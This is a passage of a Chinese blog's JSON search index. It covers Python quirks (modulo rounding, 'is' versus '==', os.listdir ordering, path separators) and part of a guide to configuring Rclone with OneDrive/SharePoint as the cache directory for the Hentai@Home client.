u9664\u6570\u7b26\u53f7\u4e00\u81f4\uff0c\u57fa\u672c\u53ef\u4ee5\u8ba4\u4e3a\u662f\u4e94\u4e94\u5f00\uff0c\u56e0\u6b64\u8bf7\u4e0d\u8981\u5c06\u67d0\u4e00\u7279\u5b9a\u7f16\u7a0b\u8bed\u8a00\u7684\u7ed3\u679c\u5f53\u4f5c\u6559\u6761\u3002</p> <p>Python \u4e4b\u7236 Guido van Rossum \u5728 The History of Python \u8868\u8fbe\u4e86\u81ea\u5df1\u7684\u770b\u6cd5\uff0c\u5373\u4e3a\u4ec0\u4e48 Python \u91c7\u7528\u4e86\u8fd9\u79cd\u820d\u5165\u89c4\u5219\u3002\u4ed6\u7684\u89c2\u70b9\u662f\uff1a</p> \u539f\u6587 \ud83c\uddec\ud83c\udde7\u7ffb\u8bd1 \ud83c\udde8\ud83c\uddf3 <p>In mathematical number theory, mathematicians always prefer the latter choice (see e.g. Wikipedia). For Python, I made the same choice because there are some interesting applications of the modulo operation where the sign of a is uninteresting. Consider taking a POSIX timestamp (seconds since the start of 1970) and turning it into the time of day. Since there are 24*3600 = 86400 seconds in a day, this calculation is simply t % 86400. But if we were to express times before 1970 using negative numbers, the \"truncate towards zero\" rule would give a meaningless result! Using the floor rule it all works out fine.</p> <p>Other applications I've thought of are computations of pixel positions in computer graphics. I'm sure there are more.</p> <p>\u5728\u6570\u8bba\u4e2d\uff0c\u6570\u5b66\u5bb6\u603b\u662f\u503e\u5411\u4e8e\u540e\u4e00\u79cd\u9009\u62e9\uff08\u5373\u5c06\u5546\u5411\u4e0b\u53d6\u6574\uff09\uff0c\u89c1 \u7ef4\u57fa\u767e\u79d1\uff08\u8bd1\u8005\u6ce8\uff1a\u53ef\u89c1 Mathematica \u548c MATLAB \u90fd\u91c7\u7528\u4e86\u8fd9\u79cd\u65b9\u5f0f\uff09\u3002\u5bf9\u4e8e Python \u6765\u8bf4\uff0c\u6211\u4e5f\u505a\u4e86\u540c\u6837\u7684\u9009\u62e9\uff0c\u56e0\u4e3a\u5728\u53d6\u6a21\u64cd\u4f5c\u7684\u4e00\u4e9b\u5e94\u7528\u4e2d\uff0c\u9664\u6570\u7684\u7b26\u53f7\u624d\u662f\u5173\u952e\u7684\uff0c\u800c\u4e0d\u662f\u88ab\u9664\u6570\u7684\u7b26\u53f7\u3002\u4f8b\u5982\u8003\u8651\u628a\u4e00\u4e2a POSIX \u65f6\u95f4\u6233\u6362\u7b97\u6210\u4e00\u5929\u7684\u65f6\u95f4\u3002\u56e0\u4e3a\u4e00\u5929\u6709 <code>24 * 3600 = 86400</code>\u79d2\uff0c\u6240\u4ee5\u8fd9\u4e2a\u8ba1\u7b97\u7406\u8bba\u4e0a\u5e94\u8be5\u5c31\u662f <code>t % 86400</code>\u3002\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u8981\u7528\u8d1f\u6570\u6765\u8868\u793a 1970 \u5e74\u4ee5\u524d\u7684\u65f6\u95f4\uff0c\u90a3\u4e48\u622a\u65ad\u9664\u6cd5\u7684\u89c4\u5219\u5c31\u4f1a\u5f97\u5230\u4e00\u4e2a\u8d1f\u6570\u7684\u79d2\u6570\uff0c\u8fd9\u662f\u6beb\u65e0\u610f\u4e49\u7684\u3002\u800c\u5411\u8d1f\u65e0\u7a77\u7684\u65b9\u5411\u820d\u5165\u5546\u7684\u8bdd\uff0c\u4e00\u5207\u90fd\u4f1a\u5f88\u987a\u5229\u3002</p> <p>\u6211\u60f3\u5230\u7684\u5176\u4ed6\u5e94\u7528\u662f\u8ba1\u7b97\u673a\u56fe\u5f62\u4e2d\u50cf\u7d20\u4f4d\u7f6e\u7684\u8ba1\u7b97\u3002\u6211\u76f8\u4fe1\u8fd8\u6709\u66f4\u591a\u8fd9\u6837\u7684\u4f8b\u5b50\u3002</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#52-is","title":"5.2 <code>is</code> \u548c <code>==</code> \u8fd0\u7b97\u7b26\u7684\u533a\u522b","text":"<p>\u76f4\u63a5\u8bf4\u7ed3\u8bba\uff1a<code>is</code> \u8fd0\u7b97\u7b26\u7528\u4e8e\u5224\u65ad\u4e24\u4e2a\u5bf9\u8c61\u662f\u5426\u662f\u540c\u4e00\u4e2a\u5bf9\u8c61\uff0c<code>==</code> \u8fd0\u7b97\u7b26\u7528\u4e8e\u5224\u65ad\u4e24\u4e2a\u5bf9\u8c61\u662f\u5426\u76f8\u7b49\u3002</p> <p>\u4f60\u53ef\u4ee5\u5728\u4efb\u610f\u5bf9\u8c61\u4e2d\u91cd\u8f7d <code>__eq__</code> \u9b54\u6cd5\u65b9\u6cd5\uff0c\u4ece\u800c\u4f7f\u8fd9\u4e2a\u5bf9\u8c61\u652f\u6301 <code>==</code> \u8fd0\u7b97\u3002</p> <pre><code>a = 1\nb = 1\nprint(a is b)  # True\nprint(a == b)  # True\n</code></pre> <pre><code>a = 1000\nb = 1000\nprint(a is b)  # False\nprint(a == b)  # True\n</code></pre> <p>\u8fd9\u4e24\u4e2a\u4f8b\u5b50\u590d\u4e60\u4e86\u6211\u4eec\u5728 3.1 \u6574\u6570\u7f13\u51b2\u533a\u5e26\u6765\u7684\u6574\u6570\u53d8\u91cf\u5730\u5740\u95ee\u9898 \u4e2d\u8ba8\u8bba\u8fc7\u7684\u95ee\u9898\u3002\u663e\u7136 <code>a == b</code> \u662f\u4e0d\u9700\u8981\u89e3\u91ca\u7684\uff0c\u800c\u7b2c\u4e00\u4e2a\u4f8b\u5b50\u4e2d <code>a is b</code> \u7684\u7ed3\u679c\u662f <code>True</code>\uff0c\u800c\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u4e2d <code>a is b</code> \u7684\u7ed3\u679c\u662f <code>False</code>\uff0c\u8fd9\u662f\u56e0\u4e3a <code>1000</code> \u662f\u5927\u6574\u6570\uff0c\u8d85\u8fc7\u4e86\u7f13\u5b58\u6240\u5e94\u7528\u8303\u56f4\uff0c\u6545\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u4e2d <code>a</code> \u548c <code>b</code> \u7684\u5730\u5740\u4e0d\u540c\uff0c\u5373\u4e0d\u662f\u540c\u4e00\u4e2a\u5bf9\u8c61\u3002</p> <pre><code>a = []\nb = []\nprint(a is b)  # False\nprint(a == b)  # True\n</code></pre> <p>\u8fd9\u91cc <code>a is b</code> \u7ed3\u679c\u662f <code>False</code> \u7684\u539f\u56e0\u66f4\u7b80\u5355\uff0c\u5217\u8868\u4e0d\u662f\u6574\u6570\u4e5f\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u7cfb\u7edf\u4e0d\u4f1a\u4e3a\u4ed6\u4eec\u91c7\u7528\u7f13\u5b58\u673a\u5236\uff0c\u56e0\u6b64 <code>a</code> \u548c <code>b</code> \u7684\u5730\u5740\u80af\u5b9a\u662f\u4e0d\u540c\u7684\u3002\u6216\u8005\u8bf4\uff0cPython \u4e2d\u7edd\u5927\u90e8\u5206\u5bf9\u8c61\u7684\u5730\u5740\u90fd\u662f\u4e0d\u540c\u7684\uff0c\u9664\u975e\u4f60\u660e\u786e\u8d4b\u503c <code>a = b</code>\u3002</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#_5","title":"\u516d\u3001\u7cfb\u7edf","text":"","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#61-oslistdir","title":"6.1 <code>os.listdir()</code> \u5728\u4e0d\u540c\u7cfb\u7edf\u4e0a\u7684\u6392\u5e8f","text":"<p>\u76f4\u63a5\u8bf4\u7ed3\u8bba\uff0c\u5982\u679c\u5728 Windows \u4e0a\u6267\u884c <code>os.listdir()</code>\uff0c\u90a3\u4e48\u5f97\u5230\u7684\u7ed3\u679c\u662f\u6309\u7167\u6587\u4ef6\u540d\u7684\u5b57\u6bcd\u987a\u5e8f\u6392\u5e8f\u7684\uff0c\u800c\u5728 Linux \u4e0a\u6267\u884c <code>os.listdir()</code>\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u662f\u4e71\u5e8f\u7684\u3002</p>  Windows Linux <pre><code>PS D:\\&gt; mkdir test | cd test\nPS D:\\test&gt; ni 2 | ni 1 | ni 9 | ni 5\nPS D:\\test&gt; python\nPython 3.10.2 (tags/v3.10.2:a58ebcc, Jan 17 2022, 14:12:15) [MSC v.1929 64 bit (AMD64)] on win32\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; import os\n&gt;&gt;&gt; os.listdir('.')\n['1', '2', '5', '9']\n&gt;&gt;&gt;\n</code></pre> <pre><code>pi@raspberrypi:~ $ mkdir test &amp;&amp; cd test\npi@raspberrypi:~/test $ touch 2 &amp;&amp; touch 1 &amp;&amp; touch 9 &amp;&amp; touch 5\npi@raspberrypi:~/test $ python3\nPython 3.7.3 (default, Jan 22 2021, 20:04:44) [GCC 8.3.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n&gt;&gt;&gt; import os\n&gt;&gt;&gt; os.listdir('.')\n['1', '2', '9', '5']\n&gt;&gt;&gt; </code></pre> <p>\u5728 Linux \u4e0b\u7684\u6392\u5e8f\u65b9\u5f0f\u5f88\u5947\u602a\uff0c\u65e2\u4e0d\u662f\u6309\u7167\u6587\u4ef6\u540d\u7684\u5b57\u6bcd\u987a\u5e8f\u6392\u5e8f\uff0c\u4e5f\u4e0d\u662f\u6309\u7167\u521b\u5efa\u6216\u4fee\u6539\u65f6\u95f4\u6392\u5e8f\u3002\u603b\u4e4b\u4f60\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u4e71\u5e8f\u3002</p> <p>\u5982\u679c\u4f60\u4f7f\u7528\u4e86 <code>os.listdir()</code> \u7684\u7a0b\u5e8f\u5f3a\u70c8\u4f9d\u8d56\u4e8e\u6587\u4ef6\u540d\u7684\u5b57\u6bcd\u987a\u5e8f\u6392\u5e8f\uff0c\u90a3\u4e48\u4f60\u9700\u8981\u5728 Linux \u4e0a\u6267\u884c <code>os.listdir()</code> \u4e4b\u540e\u5148\u4f7f\u7528 <code>sorted()</code> \u5bf9\u7ed3\u679c\u8fdb\u884c\u6392\u5e8f\u3002</p>","tags":["python"]},{"location":"blog/2022/220913-python-confusing-detail/#62-ospathjoin","title":"6.2 <code>os.path.join()</code> \u91c7\u7528\u4e0d\u540c\u7684\u5206\u9694\u7b26","text":"<p>\u5728 Windows \u4e0a\uff0c<code>os.path.join()</code> \u91c7\u7528\u7684\u662f\u4e24\u4e2a\u53cd\u659c\u6760 <code>\\\\</code> \u4f5c\u4e3a\u5206\u9694\u7b26\uff0c\u800c\u5728 Linux \u4e0a\uff0c<code>os.path.join()</code> \u91c7\u7528\u7684\u662f\u6b63\u659c\u6760 <code>/</code> \u4f5c\u4e3a\u5206\u9694\u7b26\u3002</p>  Windows Linux <pre><code>os.path.join('a', 'b')\n# 'a\\\\b'\n</code></pre> <pre><code>os.path.join('a', 'b')\n# 'a/b'\n</code></pre> <p>\u8fd9\u4e2a\u95ee\u9898\u901a\u5e38\u4e0d\u4f1a\u5bf9\u7a0b\u5e8f\u9020\u6210\u592a\u5927\u5f71\u54cd\uff0c\u56e0\u4e3a\u6211\u4eec\u4f7f\u7528 <code>os.path.join()</code> \u4f20\u5165\u9700\u8981\u4ee5\u8def\u5f84\u4f5c\u4e3a\u53c2\u6570\u7684\u51fd\u6570\u65f6\uff0c\u4e00\u5b9a\u662f\u5728\u540c\u4e00\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u5185\u8fdb\u884c\u7684\u3002</p>","tags":["python"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/","title":"\u4f7f\u7528 Rclone \u6302\u8f7d SharePoint \u4f5c\u4e3a Hentai@Home \u7684\u7f13\u5b58\u76ee\u5f55","text":"","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#_1","title":"\u4e00\u3001\u524d\u8a00","text":"","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#11-hentaihome","title":"1.1 \u4ec0\u4e48\u662f Hentai@Home","text":"<p>\u4e0d\u5c11\u4eba\u5e94\u8be5\u77e5\u9053 E-Hentai\uff0c\u8fd9\u662f\u4e16\u754c\u4e0a\u6700\u5927\u7684\u6f2b\u753b\u7f51\u7ad9\u4e4b\u4e00\u3002\u4f5c\u4e3a\u627f\u62c5\u8fd9\u4e2a\u7f51\u7ad9\u5de8\u5927\u8d1f\u8f7d\u7684\u4e00\u90e8\u5206\uff0cE-Hentai \u63d0\u4f9b\u4e86\u4e00\u4e2a\u540d\u4e3a Hentai@Home \u7684\u9879\u76ee\uff08\u4ee5\u4e0b\u7b80\u79f0 H@H\uff09\uff0c\u5b83\u7684\u76ee\u7684\u662f\u5229\u7528\u7528\u6237\u7684\u7535\u8111\u534f\u52a9 E-Hentai \u670d\u52a1\u5668\u7f13\u5b58\u56fe\u7247\uff0c\u4ece\u800c\u51cf\u8f7b\u670d\u52a1\u5668\u7684\u8d1f\u62c5\u3002</p> <p>H@H \u662f\u4e00\u4e2a\u53ef\u4ee5\u6bd4\u4f5c SETI@home \u9879\u76ee\u548c BitTorrent \u4e4b\u95f4\u4ea4\u53c9\u7684\u9879\u76ee\u3002</p> <p>\u6240\u6709\u53c2\u4e0e\u7684\u7528\u6237\u90fd\u8fd0\u884c\u4e00\u4e2a\u5c0f\u578b\u7684\u57fa\u4e8e Java \u7684\u5ba2\u6237\u7aef\uff0c\u4ece E-Hentai \u7684\u4e2d\u5fc3\u670d\u52a1\u5668\u4e0b\u8f7d\u753b\u5eca\u7684\u56fe\u50cf\u5e76\u7f13\u5b58\u5230\u4ed6\u4eec\u7684\u7535\u8111\uff0c\u5e76\u5c06\u8fd9\u4e9b\u7f13\u5b58\u4f20\u9012\u7ed9\u5176\u4ed6\u6d4f\u89c8 E-Hentai \u753b\u5eca\u7684\u4eba\u3002\u8fd9\u4f7f E-Hentai \u80fd\u591f\u4f7f\u7528\u8f83\u5c11\u7684\u4e2d\u5fc3\u670d\u52a1\u5668\u5e26\u5bbd\u63d0\u4f9b\u66f4\u591a\u7684\u56fe\u50cf\u3002</p>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#12-sharepoint","title":"1.2 \u4ec0\u4e48\u662f SharePoint","text":"<p>\u867d\u7136\u72ed\u4e49\u4e0a\u6765\u8bf4\uff0cSharePoint \u53ea\u662f\u5927\u4f19\u4eec\u7528\u4e8e\u767d\u5ad6\u5fae\u8f6f\u6765\u5b58\u50a8\u5e76\u5206\u53d1\u6587\u4ef6\u7684\u4e00\u4e2a\u7f51\u76d8\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\uff0c\u6211\u4eec\u5728\u6b64\u8fc7\u7a0b\u4e2d\u7528\u5230\u7684\u4ec5\u4ec5\u662f SharePoint \u7684 OneDrive \u529f\u80fd\u3002</p> <p>SharePoint \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u4f01\u4e1a\u7ea7\u7684\u534f\u4f5c\u5e73\u53f0\uff0c\u5b83\u53ef\u4ee5\u5e2e\u52a9\u4f01\u4e1a\u7ba1\u7406\u3001\u5b58\u50a8\u3001\u5171\u4eab\u548c\u4fdd\u62a4\u4fe1\u606f\uff0c\u540c\u65f6\u8fd8\u53ef\u4ee5\u5e2e\u52a9\u4f01\u4e1a\u66f4\u597d\u5730\u4e0e\u5ba2\u6237\u3001\u4f9b\u5e94\u5546\u548c\u5408\u4f5c\u4f19\u4f34\u8fdb\u884c\u6c9f\u901a\u548c\u534f\u4f5c\u3002</p> <p>\u5728\u6b64\u7bc7\u535a\u5ba2\u4e2d\uff0c\u6211\u4eec\u4ec5\u4ec5\u5c06 SharePoint \u4f5c\u4e3a\u4e00\u4e2a\u7f51\u76d8\u6765\u4f7f\u7528\u3002</p>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#13-rclone","title":"1.3 \u4ec0\u4e48\u662f Rclone","text":"<p>Rclone \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5b83\u53ef\u4ee5\u7528\u4e8e\u5728\u672c\u5730\u548c\u5404\u79cd\u4e91\u5b58\u50a8\u4e4b\u95f4\u540c\u6b65\u6587\u4ef6\u3002\u5b83\u652f\u6301 50 \u591a\u79cd\u4e91\u5b58\u50a8\uff0c\u5305\u62ec Dropbox\u3001Google Drive\u3001OneDrive\u3001Amazon S3\u3001Backblaze B2\u3001OpenStack Swift\u3001Hubic\u3001Yandex Disk \u7b49\u7b49\u3002</p> <p>\u501f\u52a9 Rclone \u6211\u4eec\u53ef\u4ee5\u5c06 SharePoint \u7684 OneDrive \u6302\u8f7d\u5230\u672c\u5730\uff0c\u4ece\u800c\u5b9e\u73b0\u5c06 H@H \u7684\u7f13\u5b58\u76ee\u5f55\u653e\u5728 SharePoint \u4e0a\u3002</p>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#_2","title":"\u4e8c\u3001\u51c6\u5907\u5de5\u4f5c","text":"<p>\u5728\u5f00\u59cb\u4e4b\u524d\uff0c\u4e3a\u4e86\u8282\u7ea6\u65f6\u95f4\uff0c\u6211\u5047\u8bbe\u4f60\u5df2\u7ecf\uff1a</p> <ul> <li> \u5177\u6709\u624e\u5b9e\u7684 Linux \u548c Windows \u7684\u547d\u4ee4\u884c\u77e5\u8bc6</li> <li> \u62e5\u6709\u5177\u6709\u5927\u5bb9\u91cf SharePoint \u7684 Microsoft \u8d26\u53f7</li> <li> \u4e86\u89e3 H@H \u7684\u5de5\u4f5c\u539f\u7406\uff0c\u5e76\u4e14\u5177\u6709\u8fd0\u884c H@H \u7684\u7ecf\u9a8c</li> <li> \u62e5\u6709\u4e91\u670d\u52a1\u5668\uff0c\u5e76\u4e14\u5b83\u540c\u65f6\u4e0e H@H \u548c SharePoint \u8fde\u63a5\u72b6\u51b5\u826f\u597d</li> <li> \u62e5\u6709 CET4 \u8bc1\u4e66\uff0c\u5e76\u4e14\u7b14\u8bd5\u6210\u7ee9\u81f3\u5c11\u4e3a 425 \u5206\uff08\u6216\u5728\u5176\u4ed6\u6d4b\u8bd5\u4e2d\u53d6\u5f97\u540c\u7b49\u6548\u529b\u7684\u6210\u7ee9\uff09</li> </ul> <p>\u63d0\u793a</p> <p>\u5982\u679c\u4f60\u4e0d\u5177\u5907\u4ee5\u4e0a\u6761\u4ef6\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a\uff0c\u6211\u5efa\u8bae\u4f60\u5148\u53bb\u5b8c\u6210\u8fd9\u4e9b\u51c6\u5907\u5de5\u4f5c\u3002\u8fd9\u4e9b\u5de5\u4f5c\u4e0d\u662f\u672c\u7bc7\u535a\u5ba2\u7684\u8ba8\u8bba\u8303\u56f4\uff0c\u4e14\u4e92\u8054\u7f51\u4e0a\u5df2\u7ecf\u6709\u5145\u5206\u591a\u7684\u5176\u4ed6\u6587\u7ae0\u6765\u8bb2\u89e3\u8fd9\u4e9b\u5185\u5bb9\u3002</p>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#21-rclone","title":"2.1 \u5b89\u88c5 Rclone","text":"<p>Rclone \u63d0\u4f9b\u4e86\u76f8\u5f53\u4e30\u5bcc\u7684\u5b89\u88c5\u65b9\u5f0f\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a</p> <ul> <li>\u901a\u8fc7\u5305\u7ba1\u7406\u5668\u5b89\u88c5 </li> <li>\u901a\u8fc7\u4e8c\u8fdb\u5236\u6587\u4ef6\u5b89\u88c5</li> <li>\u901a\u8fc7\u6e90\u7801\u5b89\u88c5</li> <li>\u901a\u8fc7 docker \u5b89\u88c5</li> <li>\u901a\u8fc7\u5b89\u88c5\u811a\u672c\u5b89\u88c5</li> </ul> <p>\u4f60\u53ef\u4ee5\u67e5\u770b\u5b83\u7684 \u6587\u6863\uff0c\u6216\u662f\u4f7f\u7528\u4e0b\u9762\u7684\u6b65\u9aa4\u6765\u5b89\u88c5\uff1a</p>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#_3","title":"\u76f4\u63a5\u4e0b\u8f7d","text":"<p>https://rclone.org/downloads/</p> <p>\u89c6\u4f60\u7684\u7cfb\u7edf\uff0c\u9009\u62e9 <code>.deb</code> \u6216 <code>.rpm</code> \u6587\u4ef6\uff0c\u4e0b\u8f7d\u540e\u76f4\u63a5\u4f7f\u7528 <code>dpkg -i</code> \u6216 <code>rpm -i</code> \u5b89\u88c5\u5373\u53ef\u3002</p>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#_4","title":"\u4f7f\u7528\u5305\u7ba1\u7406\u5668","text":"Debian/UbuntuCentOS <pre><code>sudo apt install rclone\n</code></pre> <pre><code>sudo yum install rclone\n</code></pre>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#22-onedrive-client_id-client_secret","title":"2.2 \u83b7\u53d6 OneDrive \u7684 <code>client_id</code> \u548c <code>client_secret</code>","text":"<p>\u8bf7\u53c2\u8003\u8fd9\u7bc7\u535a\u5ba2\uff1a\u521b\u5efa\u5fae\u8f6fOneDrive API</p> <p>\u6700\u7ec8\u4f60\u5c06\u62ff\u5230\u4f60\u7684 <code>client_id</code> \u548c <code>client_secret</code>\u3002</p> <p>\u6ce8\u610f</p> <p>\u8bf7\u53ca\u65f6\u8bb0\u5f55\u4f60\u7684 <code>client_secret</code>\uff0c\u5b83\u53ea\u4f1a\u5728\u751f\u6210\u7684\u65f6\u5019\u663e\u793a\u4e00\u6b21\u3002</p>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#_5","title":"\u4e09\u3001\u5206\u6c34\u5cad","text":"<p>\u4e4b\u6240\u4ee5\u79f0\u4e4b\u4e3a\u5206\u6c34\u5cad\uff0c\u662f\u56e0\u4e3a\u6709\u4e9b Microsoft \u8d26\u53f7\u65e0\u6cd5\u53d6\u5f97 OAuth \u6388\u6743\u3002\u8fd9\u5c06\u5bfc\u81f4\u540e\u9762\u7684\u6b65\u9aa4\u622a\u7136\u4e0d\u540c\u3002</p> <p>\u8bf7\u6839\u636e\u4ee5\u4e0b\u6b65\u9aa4\uff0c\u6765\u5f97\u77e5\u4f60\u5e94\u8be5\u8d70\u5206\u6c34\u5cad\u7684\u54ea\u4e00\u4fa7\uff1a</p> <p>\u9996\u5148\uff0c\u5728\u4f60\u7684\u7535\u8111\u4e0a \u4e0b\u8f7d Rclone\uff08\u56e0\u4e3a\u5fc5\u987b\u4f7f\u7528\u6d4f\u89c8\u5668\u8fdb\u884c OAuth\uff09\uff0c\u7136\u540e\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u5e76\u6309\u7167\u4f60\u7684\u5b9e\u9645 <code>client_id</code> \u4e0e <code>client_secret</code> \u586b\u5165\uff1a</p> <pre><code>./rclone authorize \"onedrive\" -- \"client_id\" \"client_secret\"\n</code></pre> <p>\u6b64\u65f6\uff0cRclone \u4f1a\u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00\u4e00\u4e2a\u7f51\u9875\uff0c\u8981\u6c42\u4f60\u767b\u5f55\u4f60\u7684 Microsoft \u8d26\u53f7\u3002</p> <ol> <li> <p>\u5982\u679c\u4f60\u80fd\u6b63\u5e38\u5728\u63a7\u5236\u53f0\u4e2d\u770b\u5230\u4f60\u7684 token\uff1a</p> <pre><code>token = {\"access_token\":\"xxxxxxxxxxxxxxxxxx\",\"expiry\":\"yyyyyyyyyyyyyyyy\"}\n</code></pre> <p>\u8bb0\u5f55\u8be5 token \u5907\u7528\u3002\u7136\u540e\u6309\u7167 \u56db\u3001\u521b\u5efa Rclone remote \u7ee7\u7eed\u3002</p> </li> <li> <p>\u5982\u679c\u4f60\u5728\u7f51\u9875\u4e2d\u770b\u5230\u5982\u4e0b\u9519\u8bef\uff1a</p> <pre><code>Failure!\nError: Auth Error\nDescription: No code returned by remote server\n</code></pre> <p>\u8bf7\u6309\u7167 \u901a\u8fc7 WebDAV \u89e3\u51b3 Rclone \u6302\u8f7d SharePoint \u65f6\u9047\u5230 Error: Auth Error \u7684\u65b9\u6cd5\uff0c\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u89e3\u51b3\u4e4b\u540e\u8bf7\u76f4\u63a5\u8df3\u8fc7\u7b2c\u56db\u8282\u4ece\u800c\u9605\u8bfb \u4e94\u3001\u6d4b\u8bd5\u5e76\u6302\u8f7d remote\u3002</p> </li> </ol>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#rclone-remote","title":"\u56db\u3001\u521b\u5efa Rclone remote","text":"<p>\u81f3\u6b64\uff0c\u4f60\u5df2\u7ecf\u53d6\u5f97\u4e86\u4e09\u6837\u4e1c\u897f\uff1a</p> <ul> <li>\u4f60\u7684 <code>client_id</code></li> <li>\u4f60\u7684 <code>client_secret</code></li> <li>\u4f60\u7684 <code>access_token</code></li> </ul> <p>\u5728\u4f60\u7684\u4e91\u670d\u52a1\u5668\u4e0a\u6267\u884c\uff1a</p> <pre><code>rclone config\n</code></pre> <p>\u4f1a\u51fa\u73b0\uff1a</p> <pre><code>e) Edit existing remote\nn) New remote\nd) Delete remote\nr) Rename remote\nc) Copy remote\ns) Set configuration password\nq) Quit config\ne/n/d/r/c/s/q&gt;\n</code></pre> <p>\u9009\u62e9 <code>n</code>\uff0c\u65b0\u5efa\u4e00\u4e2a\uff0c\u5e76\u5c06\u8be5\u65b0 remote \u547d\u540d\uff0c\u5047\u8bbe\u6211\u4eec\u547d\u540d\u4e3a <code>od4hath</code>\u3002</p> <p>\u4e4b\u540e\u4f1a\u51fa\u73b0\uff1a</p> <pre><code>Type of storage to configure.\nEnter a string value. Press Enter for the default (\"\").\nChoose a number from below, or type in your own value\n\n22 / Microsoft OneDrive\n   \\ \"onedrive\"\n\nStorage&gt;\n</code></pre> <p>\u4e0d\u540c\u7248\u672c Rclone \u7684\u6570\u5b57\u53ef\u80fd\u4e0d\u540c\uff0c\u6211\u8fd9\u91cc\u7684 Microsoft OneDrive \u5bf9\u5e94\u7684\u662f 22\uff0c\u6240\u4ee5\u8f93\u5165 22\u3002</p> <p>\u4e4b\u540e\u5c06\u8981\u6c42\u8f93\u5165\u4f60\u7684 <code>client_id</code> \u548c <code>client_secret</code>\uff1a</p> <pre><code>OAuth Client Id\nLeave blank normally.\nEnter a string value. Press Enter for the default (\"\").\nclient_id&gt;\n</code></pre> <p>\u590d\u5236\u4f60\u7684 <code>client_id</code> \u5373\u53ef\u3002</p> <pre><code>OAuth Client Secret\nLeave blank normally.\nEnter a string value. Press Enter for the default (\"\").\nclient_secret&gt;\n</code></pre> <p>\u590d\u5236\u4f60\u7684 <code>client_secret</code> \u5373\u53ef\u3002</p> <p>\u4e4b\u540e\u4f1a\u51fa\u73b0\uff1a</p> <pre><code>Edit advanced config? (y/n)\ny) Yes\nn) No (default)\n</code></pre> <p>\u9009\u62e9 <code>n</code>\uff0c\u4e0d\u9700\u8981\u7f16\u8f91\u9ad8\u7ea7\u914d\u7f6e\u3002</p> <pre><code>Remote config\nUse auto config?\n * Say Y if not sure\n * Say N if you are working on a remote or headless machine\ny) Yes (default)\nn) No\ny/n&gt;\n</code></pre> <p>\u56e0\u4e3a\u6211\u4eec\u662f\u5728\u4e91\u670d\u52a1\u5668\u4e0a\u914d\u7f6e\uff0c\u6240\u4ee5\u9009\u62e9 <code>n</code>\u3002\u6b64\u65f6 Rclone \u4f1a\u8981\u6c42\u4f60\u8f93\u5165\u4f60\u7684 <code>access_token</code>\uff1a</p> <pre><code>For this to work, you will need rclone available on a machine that has\na web browser available.\n\nFor more help and alternate methods see: https://rclone.org/remote_setup/\n\nExecute the following on the machine with the web browser (same rclone\nversion recommended):\n\n        rclone authorize \"onedrive\"\n\nThen paste the result below:\nresult&gt;\n</code></pre> <p>\u590d\u5236\u4f60\u5148\u524d\u4fdd\u5b58\u7684 <code>access_token</code> \u5373\u53ef\u3002</p> <p>\u4e4b\u540e\u4f1a\u51fa\u73b0\uff1a</p> <pre><code>Choose a number from below, or type in an existing value\n 1 / OneDrive Personal or Business\n   \\ \"onedrive\"\n 2 / Sharepoint site\n   \\ \"sharepoint\"\n 3 / Type in driveID\n   \\ \"driveid\"\n 4 / Type in SiteID\n   \\ \"siteid\"\n 5 / Search a Sharepoint site\n   \\ \"search\"\nYour choice&gt;\n</code></pre> <p>\u89c6\u4f60\u81ea\u5df1\u60c5\u51b5\u800c\u5b9a\u3002</p> <p>\u4e4b\u540e\u4f60\u5c06\u83b7\u5f97\u4e00\u4e2a\u5df2\u7ecf\u914d\u7f6e\u597d\u7684 remote\u3002</p>","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#remote","title":"\u4e94\u3001\u6d4b\u8bd5\u5e76\u6302\u8f7d remote","text":"","tags":["guide","sharepoint","rclone","hentaiathome"]},{"location":"blog/2022/221113-rclone-sharepoint-for-hentai-at-home/#51-remote","title":"5.1 \u6d4b\u8bd5 remote","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528</p> 